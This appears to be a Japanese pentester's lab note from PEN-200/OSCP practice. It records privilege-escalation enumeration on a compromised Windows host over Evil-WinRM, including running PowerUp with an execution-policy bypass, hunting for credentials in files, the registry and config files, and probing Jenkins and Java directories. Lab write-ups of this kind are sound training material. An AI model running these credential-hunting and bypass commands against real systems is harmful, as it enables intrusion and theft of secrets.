TaskName:                             \Microsoft\Windows\Workplace Join\Recovery-Check
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          %SystemRoot%\System32\dsregcmd.exe /checkrecovery
Start In:                             N/A
Comment:                              Performs recovery check.
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 02:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

```

---

### インストール済みアプリケーション

- Java, Jenkinsなどの情報
```powershell
*Evil-WinRM* PS C:\Users\b.martin\Documents> # Access deninedのときは、reg query "HKLM\..."
# 改行入るが結果に影響はない
$paths = @(
  "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*","HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*")
Get-ItemProperty -Path $paths -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName } | Select-Object DisplayName, DisplayVersion, InstallLocation, UninstallString | Sort-Object DisplayName

*Evil-WinRM* PS C:\Users\b.martin\Documents> whoami
oscp\b.martin
*Evil-WinRM* PS C:\Users\b.martin\Documents> dir "C:\Program Files"


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        10/9/2024   3:21 PM                Common Files
d-----         9/6/2019   5:31 PM                internet explorer
d-----        10/9/2024   1:24 PM                Java
d-----        10/9/2024   1:26 PM                Jenkins
d-----        10/9/2024   1:29 PM                MsEdgeCrashpad
d-----        10/9/2024   1:22 PM                PackageManagement
d-----        10/9/2024   3:21 PM                VMware
d-----        10/9/2024   1:11 PM                Windows Defender
d-----        9/15/2018  12:19 AM                Windows Mail
d-----         9/6/2019   5:31 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----         9/6/2019   5:31 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d-----        10/9/2024   1:22 PM                WindowsPowerShell
-a----        10/9/2024   1:32 PM         140323 msedge_installer.log


*Evil-WinRM* PS C:\Users\b.martin\Documents> dir "C:\Program Files (x86)"

...# none of interesting thing


*Evil-WinRM* PS C:\Users\b.martin\Documents> dir ~\Downloads
```


---

### 実行中のプロセス

- jenkinsがめちゃくちゃ気になる....
```powershell
*Evil-WinRM* PS C:\Users\b.martin\Documents> ps | Where-Object -Property ProcessName -notin "svchost"

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    147      10     6628      12128              3952   0 conhost
    435      17     1956       5172               380   0 csrss
    163       9     1608       4632               484   1 csrss
    254      14     3808      13168              3136   0 dllhost
    542      22    23984      49736               968   1 dwm
     48       6     1624       4008               788   1 fontdrvhost
     48       6     1496       3840               796   0 fontdrvhost
      0       0       56          8                 0   0 Idle
    775      28   307016     275672              3944   0 java
    264      15    18184      20928              3712   0 jenkins
    470      26    12540      49400              2428   1 LogonUI
    993      31     6008      17012               644   0 lsass
    223      13     3184      10044              3304   0 msdtc
      0      12      276      72676                88   0 Registry
    529      13     4960      12292               624   0 services
     53       3      456       1116               272   0 smss
   1448       0      192        104                 4   0 System
    167      11     2872      11264              2320   0 VGAuthService
    143       8     1660       6788              2336   0 vm3dservice
    136       9     1744       7112              2680   1 vm3dservice
    408      25    10064      22980              2328   0 vmtoolsd
    170      11     1316       6600               500   0 wininit
    237      12     2492      18272               548   1 winlogon
    343      17     8852      18636              3152   0 WmiPrvSE
   1554      34    69532      94304       1.72   2268   0 wsmprovhost
   1374      31    64112      84156       0.78   4104   0 wsmprovhost
    540      25    65928      83460       0.50   4720   0 wsmprovhost

```

- リアルタイムプロセスの列挙 -> nothing
```powershell
*Evil-WinRM* PS  powershell -ep bypass -c 'import-module .\Watch-Command.ps1; ps -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -S
```

---

### PowerShellログ -> none

```powershell
*Evil-WinRM* PS C:\Users\b.martin\Documents> (Get-PSReadlineOption).HistorySavePath
C:\Users\b.martin\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt
*Evil-WinRM* PS C:\Users\b.martin\Documents> type "C:\Users\b.martin\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt"
Cannot find path 'C:\Users\b.martin\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt' because it does not exist.
At line:1 char:1
+ type "C:\Users\b.martin\AppData\Roaming\Microsoft\Windows\PowerShell\ ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\b.mart...ost_history.txt:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand

```
→なし

---

### サービス -> get-ciminstance, powerupが使えないため、一旦スキップ

- winrm接続なので、`Get-CimInstance`は使えない
	- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)を使用
```zsh
┌──(koshi㉿kali)-[~/PEN-200/AD/SRV22]
└─$ cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
```
```powershell
*Evil-WinRM* PS C:\Users\b.martin\Documents> upload PowerUp.ps1
                                        
Info: Uploading /home/koshi/PEN-200/AD/SRV22/PowerUp.ps1 to C:\Users\b.martin\Documents\PowerUp.ps1
                                        
Data: 800772 bytes of 800772 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\b.martin\Documents> powershell -ep bypass -c 'import-module .\PowerUp.ps1; Get-ModifiableService; Get-ModifiableServiceFile; '
```
```powershell
*Evil-WinRM* PS C:\Users\b.martin\Documents> powershell -ep bypass -c 'import-module .\PowerUp.ps1; Get-ModifiableService; Get-ModifiableServiceFile; '
powershell.exe : Get-Service : Cannot open Service Control Manager on computer '.'. This operation might require 
    + CategoryInfo          : NotSpecified: (Get-Service : C... might require :String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
other privileges.                                                                                                                                                               
At C:\Users\b.martin\Documents\PowerUp.ps1:2189 char:5                                                                                                                          
+     Get-Service | Test-ServiceDaclPermission -PermissionSet 'ChangeCo ...                                                                                                     
+     ~~~~~~~~~~~                                                                                                                                                               
    + CategoryInfo          : NotSpecified: (:) [Get-Service], InvalidOperationException                                                                                        
    + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.PowerShell.Commands.GetSe                                                                              
   rviceCommand                                                                                                                                                 
Get-WMIObject : Access denied                                                                                                                                                   
At C:\Users\b.martin\Documents\PowerUp.ps1:2133 char:5                                                                                                                          
+     Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pat ...                                                                                                     
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                                                                                                        
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException                                                                                        
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObject    
```

---

### スケジュールタスク -> nothing

```powershell
*Evil-WinRM* PS C:\Users\b.martin\Documents> $header="HostName","TaskName","NextRunTime","Status","LogonMode","LastRunTime","LastResult","Author","TaskToRun","StartIn","Comment","ScheduledTaskState","IdleTime","PowerManagement","RunAsUser","DeleteTaskIfNotRescheduled","StopTaskIfRunsXHoursandXMins","Schedule","ScheduleType","StartTime","StartDate","EndDate","Days","Months","RepeatEvery","RepeatUntilTime","RepeatUntilDuration","RepeatStopIfStillRunning"
schtasks /query /fo csv /nh /v | ConvertFrom-Csv -Header $header | select -uniq TaskName,NextRunTime,ScheduleType,Status,TaskToRun,RunAsUser | Where-Object {$_.RunAsUser -ne $env:UserName -and $_.TaskToRun -notlike "%windir%*" -and $_.TaskToRun -ne "COM handler" -and $_.TaskToRun -notlike "%systemroot%*" -and $_.TaskToRun -notlike "C:\Windows\*" -and $_.TaskName -notlike "\Microsoft\Windows\*"}
```

```powershell
*Evil-WinRM* PS C:\Users\b.martin\Documents>  powershell -ep bypass -c 'import-module .\PowerUp.ps1; Get-ModifiableScheduledTaskFile '
```

---

### 興味深い情報

#### common

```powershell
# ls -Path C:\Users -Include *.txt,*.ini,*.zip -File -Recurse -ErrorAction SilentlyContinue→なし
# cmdkey /list →なし
# ls env:→なし
# type "C:\inetpub\wwwroot\web.config" | findstr connectionString→なし
# findstr /s /i "connectionString" "C:\Windows\Microsoft.NET\Framework*\*\Config\web.config"→なし
# reg query "HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions" /sなし
# *Evil-WinRM* PS C:\Program Files\Java\jdk-21> ls -Recurse -Include *.txt,*.ini,*.cfg,*.config,*conf,*.xml,*.git,*.ps1,*.yml -File | Select-String -Pattern "pass(word)?|pwd|cred(ential)?" -List | Select-Object -ExpandProperty Path　→なし
```

#### Program Files

- jenkinsディレクトリはアクセス不可
```powershell
*Evil-WinRM* PS C:\Program Files> dir Java


    Directory: C:\Program Files\Java


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        10/9/2024   1:24 PM                jdk-21

*Evil-WinRM* PS C:\Program Files> dir Jenkins
Access to the path 'C:\Program Files\Jenkins' is denied.
At line:1 char:1
+ dir Jenkins
+ ~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Program Files\Jenkins:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

```

#### Javaディレクトリ

##### jdk-21\conf\management

- ディレクトリ書き込み不可
- ファイルも書き込み不可

```powershell
*Evil-WinRM* PS C:\Program Files\Java\jdk-21> cmd /c "dir .\*pass* /S /B 2>nul"
C:\Program Files\Java\jdk-21\conf\management\jmxremote.password.template
```

- `jmxremote.password.template`の中身で気になる記述
```
# Default location of this file is $JRE/conf/management/jmxremote.password
# password entry follows the below syntax
#   role_name W [clearPassword|hashedPassword]

//クラックは難しそう

# hashedPassword = base64_encoded_64_byte_salt W base64_encoded_hash W hash_algorithm
# where,
#   base64_encoded_64_byte_salt = 64 byte random salt
#   base64_encoded_hash = Hash_algorithm(password + salt)
#   W = spaces or tabs
#   hash_algorithm = Algorithm string specified using the format below

ロールのパスワードを変更するには、ハッシュ化されたパスワードエントリを新しい平文パスワードまたは新しいハッシュ化されたパスワードで置き換えてください。新しいパスワードが平文の場合、次回ログイン試行時にそのハッシュ値に置き換えられます。
```

- 
```powershell
*Evil-WinRM* PS C:\Program Files\Java\jdk-21\conf\management> dir


    Directory: C:\Program Files\Java\jdk-21\conf\management


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM           3997 jmxremote.access
-a----        10/9/2024   1:24 PM           5690 jmxremote.password.template
-a----        10/9/2024   1:24 PM          14988 management.properties

```
- ちなみに、`jmxremote.password`のテンプレートじゃないファイルはなかった


>jmxremote.password は、Java の JMX (Java Management Extensions) が基本パスワード認証に使用するプレーンテキストファイルであり、リモート管理のためのユーザーロール（monitorRole、controlRole など）とそのパスワードを定義します。厳格なファイル権限（所有者のみ読み書き可能）で保護され、認証のために jmxremote.access ファイルと組み合わせて使用する必要があります。通常は $JRE_HOME/lib/management またはカスタムの場所に配置され、Java VM が特定の JMX システムプロパティを有効にして起動する際にその内容（役割:パスワード）が読み込まれます。ただしパスワードが平文で保存されるためセキュリティリスクとなり、本番環境では SSL/TLS などのセキュリティ対策が不可欠です。 

###### ファイルの中身

- jmxremote.password.template
```
モニタリングへのリモート JMX API アクセス用のパスワードファイルです。このファイルは、様々なロールとそのパスワードを定義します。アクセス制御ファイル（デフォルトでは jmxremote.access）は、各ロールに許可されるアクセスを定義します。ロールが機能するには、パスワードファイルとアクセスファイルの両方にエントリが必要です。

このファイルは所有者のみがアクセスできるようにする必要があります。所有者でない場合、プログラムはエラーで終了します。
```

- jmxremote.access
```zsh
monitorRole   readonly
controlRole   readwrite \
              create javax.management.monitor.*,javax.management.timer.* \
              unregister
```

##### jdk-21

- releseにはJAVAのバージョンが最新であることが書いてある
```powershell*Evil-WinRM* PS C:\Program Files\Java\jdk-21> cat release
IMPLEMENTOR="Oracle Corporation"
JAVA_RUNTIME_VERSION="21.0.3+7-LTS-152"
JAVA_VERSION="21.0.3"
JAVA_VERSION_DATE="2024-04-16"
LIBC="default"
MODULES="java.base java.compiler java.datatransfer java.xml java.prefs java.desktop java.instrument java.logging java.management java.security.sasl java.naming java.rmi java.management.rmi java.net.http java.scripting java.security.jgss java.transaction.xa java.sql java.sql.rowset java.xml.crypto java.se java.smartcardio jdk.accessibility jdk.internal.jvmstat jdk.attach jdk.charsets jdk.internal.opt jdk.zipfs jdk.compiler jdk.crypto.ec jdk.crypto.cryptoki jdk.crypto.mscapi jdk.dynalink jdk.internal.ed jdk.editpad jdk.hotspot.agent jdk.httpserver jdk.incubator.vector jdk.internal.le jdk.internal.vm.ci jdk.internal.vm.compiler jdk.internal.vm.compiler.management jdk.jartool jdk.javadoc jdk.jcmd jdk.management jdk.management.agent jdk.jconsole jdk.jdeps jdk.jdwp.agent jdk.jdi jdk.jfr jdk.jlink jdk.jpackage jdk.jshell jdk.jsobject jdk.jstatd jdk.localedata jdk.management.jfr jdk.naming.dns jdk.naming.rmi jdk.net jdk.nio.mapmode jdk.random jdk.sctp jdk.security.auth jdk.security.jgss jdk.unsupported jdk.unsupported.desktop jdk.xml.dom"
OS_ARCH="x86_64"
OS_NAME="Windows"
SOURCE=".:git:3616c414a4bd open:git:5824c8492fe2"
```

##### jdk-21/bin -> nothing

##### jdk-21\conf\security


```powershell
*Evil-WinRM* PS C:\Users\b.martin\Documents> Get-Service jenkins
Cannot find any service with service name 'jenkins'.
At line:1 char:1
+ Get-Service jenkins
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (jenkins:String) [Get-Service], ServiceCommandException
    + FullyQualifiedErrorId : NoServiceFoundForGivenName,Microsoft.PowerShell.Commands.GetServiceCommand
```
```powershell
Get-Process java | Format-List *
Name                       : java
Id                         : 3944
PriorityClass              :
FileVersion                :
HandleCount                : 755
WorkingSet                 : 280801280
PagedMemorySize            : 312946688
PrivateMemorySize          : 312946688
VirtualMemorySize          : 2138628096
TotalProcessorTime         :
SI                         : 0
Handles                    : 755
VM                         : 6433595392
WS                         : 280801280
PM                         : 312946688
NPM                        : 28424
Path                       :
Company                    :
CPU                        :
ProductVersion             :
Description                :
Product                    :
__NounName                 : Process
BasePriority               : 8
ExitCode                   :
HasExited                  :
ExitTime                   :
Handle                     :
SafeHandle                 :
MachineName                : .
MainWindowHandle           : 0
MainWindowTitle            :
MainModule                 :
MaxWorkingSet              :
MinWorkingSet              :
Modules                    :
NonpagedSystemMemorySize   : 28424
NonpagedSystemMemorySize64 : 28424
PagedMemorySize64          : 312946688
PagedSystemMemorySize      : 485152
PagedSystemMemorySize64    : 485152
PeakPagedMemorySize        : 336048128
PeakPagedMemorySize64      : 336048128
PeakWorkingSet             : 303083520
PeakWorkingSet64           : 303083520
PeakVirtualMemorySize      : -2140897280
PeakVirtualMemorySize64    : 6449037312
PriorityBoostEnabled       :
PrivateMemorySize64        : 312946688
PrivilegedProcessorTime    :
ProcessName                : java
ProcessorAffinity          :
Responding                 : True
SessionId                  : 0
StartInfo                  : System.Diagnostics.ProcessStartInfo
StartTime                  :
SynchronizingObject        :
Threads                    : {3948, 4012, 4016, 4020...}
UserProcessorTime          :
VirtualMemorySize64        : 6433595392
EnableRaisingEvents        : False
StandardInput              :
StandardOutput             :
StandardError              :
WorkingSet64               : 280801280
Site                       :
Container                  :

```

```powershell
*Evil-WinRM* PS C:\Users\b.martin\Documents> Get-ChildItem -Recurse C:\ -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "jenkins"} -ErrorAction SilentlyContinue


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        10/9/2024   1:26 PM                Jenkins


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        10/9/2024   1:26 PM                jenkins


```

```powershell
*Evil-WinRM* PS C:\Users\b.martin\Documents> sc.exe query jenkins
[SC] EnumQueryServicesStatus:OpenService FAILED 5:

Access is denied.

*Evil-WinRM* PS C:\Users\b.martin\Documents> 

```


#### misc

```powershell
*Evil-WinRM* PS C:\Scripts> dir


    Directory: C:\Scripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/22/2023   4:14 AM            104 accounting.vbs
-a----        2/22/2023   4:14 AM            107 date_time.vbs
-a----        2/22/2023   4:29 AM            322 dns.vbs
-a----        2/22/2023   4:30 AM            363 dns_update.vbs
-a----        2/22/2023   4:29 AM           2693 exchange_logon.vbs
-a----        2/22/2023   4:32 AM            190 firewall.vbs
-a----        2/22/2023   4:11 AM            166 greeting.vbs
-a----        2/22/2023   4:16 AM            201 pword_string.vbs
-a----        10/3/2024   7:23 PM            194 tasks.vbs
-a----        2/22/2023   4:14 AM            345 time_format.vbs

```

```powershell
*Evil-WinRM* PS C:\Program Files> dir


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        10/9/2024   3:21 PM                Common Files
d-----         9/6/2019   5:31 PM                internet explorer
d-----        10/9/2024   1:24 PM                Java
d-----        10/9/2024   1:26 PM                Jenkins
d-----        10/9/2024   1:29 PM                MsEdgeCrashpad
d-----        10/9/2024   1:22 PM                PackageManagement
d-----        10/9/2024   3:21 PM                VMware
d-----        10/9/2024   1:11 PM                Windows Defender
d-----        9/15/2018  12:19 AM                Windows Mail
d-----         9/6/2019   5:31 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----         9/6/2019   5:31 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d-----        10/9/2024   1:22 PM                WindowsPowerShell
-a----        10/9/2024   1:32 PM         140323 msedge_installer.log

```

### Javaディレクトリ配下

```powershell

*Evil-WinRM* PS C:\Program Files\Java> ls -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Program Files\Java\jdk-21


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM            290 README
-a----        10/9/2024   1:24 PM           1282 release


    Directory: C:\Program Files\Java\jdk-21\bin


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM          22008 api-ms-win-core-console-l1-1-0.dll
...


    Directory: C:\Program Files\Java\jdk-21\bin\server


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM       13500416 classes.jsa
-a----        10/9/2024   1:24 PM       13500416 classes_nocoops.jsa
-a----        10/9/2024   1:24 PM       13310576 jvm.dll


    Directory: C:\Program Files\Java\jdk-21\conf


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM           7302 jaxp.properties
-a----        10/9/2024   1:24 PM           2732 logging.properties
-a----        10/9/2024   1:24 PM           6671 net.properties
-a----        10/9/2024   1:24 PM           1210 sound.properties


    Directory: C:\Program Files\Java\jdk-21\conf\management


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM           3997 jmxremote.access
-a----        10/9/2024   1:24 PM           5690 jmxremote.password.template
-a----        10/9/2024   1:24 PM          14988 management.properties


    Directory: C:\Program Files\Java\jdk-21\conf\security


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM           2294 java.policy
-a----        10/9/2024   1:24 PM          65787 java.security


    Directory: C:\Program Files\Java\jdk-21\conf\security\policy


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM           2390 README.txt


    Directory: C:\Program Files\Java\jdk-21\conf\security\policy\limited


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM            647 default_local.policy
-a----        10/9/2024   1:24 PM            146 default_US_export.policy
-a----        10/9/2024   1:24 PM            566 exempt_local.policy


    Directory: C:\Program Files\Java\jdk-21\conf\security\policy\unlimited


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM            193 default_local.policy
-a----        10/9/2024   1:24 PM            146 default_US_export.policy


    Directory: C:\Program Files\Java\jdk-21\include


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM          21158 classfile_constants.h
-a----        10/9/2024   1:24 PM          11461 jawt.h
-a----        10/9/2024   1:24 PM           7169 jdwpTransport.h
-a----        10/9/2024   1:24 PM          75021 jni.h
-a----        10/9/2024   1:24 PM          84670 jvmti.h
-a----        10/9/2024   1:24 PM           3774 jvmticmlr.h


    Directory: C:\Program Files\Java\jdk-21\include\win32


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM            898 jawt_md.h
-a----        10/9/2024   1:24 PM            583 jni_md.h


    Directory: C:\Program Files\Java\jdk-21\include\win32\bridge


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM           4521 AccessBridgeCallbacks.h
-a----        10/9/2024   1:24 PM          35053 AccessBridgeCalls.h
-a----        10/9/2024   1:24 PM          76585 AccessBridgePackages.h


    Directory: C:\Program Files\Java\jdk-21\jmods


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM       21700494 java.base.jmod
...(省略)

    Directory: C:\Program Files\Java\jdk-21\legal\java.base


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM           1444 aes.md
-a----        10/9/2024   1:24 PM           1582 asm.md
-a----        10/9/2024   1:24 PM           1556 c-libutl.md
-a----        10/9/2024   1:24 PM           9601 cldr.md
-a----        10/9/2024   1:24 PM          30197 icu.md
-a----        10/9/2024   1:24 PM          17783 public_suffix.md
-a----        10/9/2024   1:24 PM           9078 unicode.md
-a----        10/9/2024   1:24 PM           1454 wepoll.md
-a----        10/9/2024   1:24 PM           1011 zlib.md

    Directory: C:\Program Files\Java\jdk-21\legal\java.desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM            167 colorimaging.md
-a----        10/9/2024   1:24 PM          11899 freetype.md
-a----        10/9/2024   1:24 PM           1288 giflib.md
-a----        10/9/2024   1:24 PM           3627 harfbuzz.md
-a----        10/9/2024   1:24 PM           3474 jpeg.md
-a----        10/9/2024   1:24 PM           2630 lcms.md
-a----        10/9/2024   1:24 PM           6980 libpng.md
-a----        10/9/2024   1:24 PM           5732 mesa3d.md



    Directory: C:\Program Files\Java\jdk-21\legal\java.xml


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM          11195 bcel.md
-a----        10/9/2024   1:24 PM           3761 dom.md
-a----        10/9/2024   1:24 PM           1448 jcup.md
-a----        10/9/2024   1:24 PM          13477 xalan.md
-a----        10/9/2024   1:24 PM          11848 xerces.md


    Directory: C:\Program Files\Java\jdk-21\legal\java.xml.crypto


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM          11499 santuario.md


   
    Directory: C:\Program Files\Java\jdk-21\legal\jdk.crypto.cryptoki


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM           3923 pkcs11cryptotoken.md
-a----        10/9/2024   1:24 PM           2131 pkcs11wrapper.md




    Directory: C:\Program Files\Java\jdk-21\legal\jdk.dynalink


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM           1502 dynalink.md

    Directory: C:\Program Files\Java\jdk-21\legal\jdk.internal.le


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM           1579 jline.md


    Directory: C:\Program Files\Java\jdk-21\legal\jdk.internal.opt


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM           1122 jopt-simple.md


    Directory: C:\Program Files\Java\jdk-21\legal\jdk.javadoc


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM           2936 jquery.md
-a----        10/9/2024   1:24 PM           1870 jqueryUI.md

    Directory: C:\Program Files\Java\jdk-21\legal\jdk.localedata


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM             33 cldr.md
-a----        10/9/2024   1:24 PM           1346 thaidict.md


    Directory: C:\Program Files\Java\jdk-21\legal\jdk.management


    Directory: C:\Program Files\Java\jdk-21\lib


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM          80855 classlist
-a----        10/9/2024   1:24 PM       11302312 ct.sym
-a----        10/9/2024   1:24 PM           4836 fontconfig.bfc
-a----        10/9/2024   1:24 PM          11615 fontconfig.properties.src
-a----        10/9/2024   1:24 PM           1682 jawt.lib
-a----        10/9/2024   1:24 PM         110109 jrt-fs.jar
-a----        10/9/2024   1:24 PM             29 jvm.cfg
-a----        10/9/2024   1:24 PM        1128044 jvm.lib
-a----        10/9/2024   1:24 PM      138051721 modules
-a----        10/9/2024   1:24 PM           2796 psfont.properties.ja
-a----        10/9/2024   1:24 PM          10393 psfontj2d.properties
-a----        10/9/2024   1:24 PM       44896702 src.zip
-a----        10/9/2024   1:24 PM         104163 tzdb.dat
-a----        10/9/2024   1:24 PM          22190 tzmappings


    Directory: C:\Program Files\Java\jdk-21\lib\jfr


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM          37398 default.jfc
-a----        10/9/2024   1:24 PM          37353 profile.jfc


    Directory: C:\Program Files\Java\jdk-21\lib\security


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/9/2024   1:24 PM           2527 blocked.certs
-a----        10/9/2024   1:24 PM         131951 cacerts
-a----        10/9/2024   1:24 PM          11380 default.policy
-a----        10/9/2024   1:24 PM         230480 public_suffix_list.dat


*Evil-WinRM* PS C:\Program Files\Java> 

```

- binの書き込み権限はなし
```powrshell
Evil-WinRM* PS C:\Program Files\Java\jdk-21> icacls .\bin
.\bin NT SERVICE\TrustedInstaller:(I)(F)
      NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
      NT AUTHORITY\SYSTEM:(I)(F)
      NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
      BUILTIN\Administrators:(I)(F)
      BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
      BUILTIN\Users:(I)(RX)
      BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
      CREATOR OWNER:(I)(OI)(CI)(IO)(F)
      APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
      APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
      APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
      APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
```

## C:scrpts

```powershell
ls -Recurse -Include vbs -File | Select-String -Pattern "pass(word)?|pwd|cred(ential)?" -List | Select-Object -ExpandProperty Path
```
```powershell
*Evil-WinRM* PS C:\Scripts> type C:\Scripts\exchange_logon.vbs
' List Exchange Logon Information


On Error Resume Next

strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
â€‚â€‚â€‚â€‚& "{impersonationLevel=impersonate}!\\" & strComputer & _
â€‚â€‚â€‚â€‚â€‚â€‚â€‚â€‚"\ROOT\MicrosoftExchangeV2")

Set colItems = objWMIService.ExecQuery("Select * from Exchange_Logon")

For Each objItem in colItems
â€‚â€‚â€‚â€‚Wscript.Echo "Client version: " & objItem.ClientVersion
â€‚â€‚â€‚â€‚Wscript.Echo "Code page ID: " & objItem.CodePageID
â€‚â€‚â€‚â€‚Wscript.Echo "Folder operations rate: " & _
â€‚â€‚â€‚â€‚â€‚â€‚â€‚â€‚objItem.FolderOperationsRate
â€‚â€‚â€‚â€‚Wscript.Echo "Host addess: " & objItem.HostAddress
â€‚â€‚â€‚â€‚Wscript.Echo "Last operation time: " & _
â€‚â€‚â€‚â€‚â€‚â€‚â€‚â€‚objItem.LastOperationTime
â€‚â€‚â€‚â€‚Wscript.Echo "Locale ID: " & objItem.LocaleID
â€‚â€‚â€‚â€‚Wscript.Echo "Logged-on user account: " & _
â€‚â€‚â€‚â€‚â€‚â€‚â€‚â€‚objItem.LoggedOnUserAccount
â€‚â€‚â€‚â€‚Wscript.Echo "Logged-on user's malibx legacy distinguished name: " _
â€‚â€‚â€‚â€‚â€‚â€‚â€‚â€‚& objItem.LoggedOnUsersMailboxLegacyDN
â€‚â€‚â€‚â€‚Wscript.Echo "Logon time: " & objItem.LogonTime
â€‚â€‚â€‚â€‚Wscript.Echo "Mailbox display name: " & _
â€‚â€‚â€‚â€‚â€‚â€‚â€‚â€‚objItem.MailboxDisplayName
